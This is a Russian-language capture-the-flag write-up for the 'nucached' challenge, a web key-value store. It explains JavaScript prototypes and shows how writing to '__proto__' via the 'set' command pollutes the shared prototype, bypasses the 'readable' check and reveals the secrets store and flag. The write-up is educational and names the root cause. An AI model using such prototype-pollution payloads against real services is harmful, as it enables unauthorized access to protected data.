# Nucached: Write-up

Имеем веб-сервис, выглядящий как терминальчик, на котором можно вводить команды. Начнем с самого очевидного, что приходит в голову — `help`:

```
> help
nucached: a revolutionary alternative to memcached!
(c) 2003, Vasya Pupkin
Usage:
  help: Show this message
  get key: Show key key
  set key value: Set the value of key to value
  ls: List all keys
Nested key-value objects are supported, e.g. set a.b.c value.
```

По-видимому, это обычное key-value хранилище. Посмотрим, что там уже есть:

```
> ls
Store secrets (unreadable) = ???
Store main:
  main.hello = "Hello, world!"
```

Ага, понятненько. Убедимся, что мы вообще понимаем, как работают команды:

```
> get main.hello
"Hello, world!"

> get main
{"hello":"Hello, world!"}
```

Попробуем на удачу?

```
> get secrets
unreadable namespace secrets

> get secrets.flag
unreadable namespace secrets
```

По-видимому, так просто обойти защиту не получится. Пора обратиться к исходному коду.

Интересующий нас файл `worker.js` отвечает за чтение и запись, а также проверку разрешений. Проверка на `unreadable namespace` выглядит так:

```javascript
if(!object[ns].readable) {
    return `<i>unreadable namespace</i> ${escapeHTML(ns)}\n`;
}
```

По умолчанию это свойство на `secrets` вообще не установлено:

```javascript
const STORES = {
    secrets: {
        writable: true,
        value: {
            flag
        }
    },
    main: {
        readable: true,
        writable: true,
        value: {
            hello: "Hello, world!"
        }
    }
};
```

Гугля «js exploit change property» или «js exploit add property», можно достаточно быстро наткнуться на описание уязвимости prototype pollution.

Идея уязвимости заключается в следующем. ООП в JavaScript устроено так, что у каждого объекта `x` имеется свойство `__proto__`, которое также является объектом, и при чтении свойства `x.someProperty`, если свойство `someProperty` не установлено, вместо него читается `x.__proto__.someProperty`, при его отсутствии — `x.__proto__.__proto__.someProperty` и так далее. Соответственно, для того, чтобы создать класс, надо определить некоторый «базовый» объект, свойствами которого будут методы класса, а в конструкторе поставить этот базовый объект в качестве `__proto__` объекта, содержащего методы конкретного инстанса класса. Например:

```javascript
const BASE_CAT = {
    meow() {
        return `"Meow!!", says ${this.name}.`;
    }
};

function Cat(name) {
    const self = {__proto__: BASE_CAT};
    self.name = name;
    return self;
}

const cat = Cat("Mittens");
cat.meow();
```

Поскольку заводить на каждый класс сразу две переменные — `BASE_CAT` и `Cat` — неудобно, вместо `BASE_CAT` используют `Cat.prototype` (для этого свойство `prototype` установлено в `{}` по умолчанию у каждой функции):

```javascript
function Cat(name) {
    const self = {__proto__: Cat.prototype};
    self.name = name;
    return self;
}

Cat.prototype.meow = function() {
    return `"Meow!!", says ${this.name}.`;
};

const cat = Cat("Mittens");
cat.meow();
```

Но поскольку это очень частый паттерн, в JavaScript есть оператор `new`, который делает ровно то, что описано в функции `Cat`, но более удобно: он создает объект `{__proto__: Cat.Prototype}` и подставляет его в качестве переменной `this`, а затем `this` возвращает. То есть код выше можно упростить до:

```javascript
function Cat(name) {
    this.name = name;
}

Cat.prototype.meow = function() {
    return `"Meow!!", says ${this.name}.`;
};

const cat = new Cat("Mittens");
cat.meow();
```

Это действительно один из самых простых методов реализации ООП, но он плохо сочетается с другой особенностью JavaScript. Во многих языках, например, Python и C++, разделяются *свойства*, которые могут быть полями и методами, например `dict.items()` или `std::vector::size()`, и *элементы*, которые свои у каждой конкретной структуры данных, например, `dict[key]` и `vector[index]`. В JavaScript же свойство и элемент — это одно и то же, поэтому, если программа позволяет записать что-то в свойство `__proto__`, прототип объекта изменится. Это можно воспроизвести прямо в nucached:

```
> set main.test {"a": 1}
success

> set main.test.__proto__ {"b": 2}
success

> get main.test.a
1

> get main.test.b
2

> set main.test.__proto__ {}
success

> get main.test.b
non-existent
```

Однако ещё хуже, если можно переписать не свойство `__proto__`, а что-то *внутри* свойства `__proto__`, потому что это изменяет прототип всех объектов, наследующихся от того же самого родителя; но все объекты, создаваемые через `{}`, имеют общий прототип, поэтому если мы добавим поле `readable` внутри прототипа любого объекта, оно появится у вообще всех объектов, включая тот, который проверяется условием `object[ns].readable`:

```
> set main.__proto__.readable 1
success

> ls
Store secrets:
  secrets.flag = "ugra_now_go_patch_your_own_websites_bpzgfnr7bfnp"
  secrets.readable = 1
Store main:
  main.hello = "Hello, world!"
  main.test
    main.test.a = 1
    main.test.readable = 1
  main.readable = 1
Store readable (unwritable) = undefined
```

Уязвимость в данном случае заключается в том, что `set` не проверяет, не переписывает ли оно специальное поле `__proto__`. Другие поля, конечно, также могут быть опасными, если их можно заменить на что угодно (например, метод `toString`), поэтому при реализации алгоритмов десериализации надо быть очень осторожным.

Флаг: **ugra_now_go_patch_your_own_websites_bpzgfnr7bfnp**
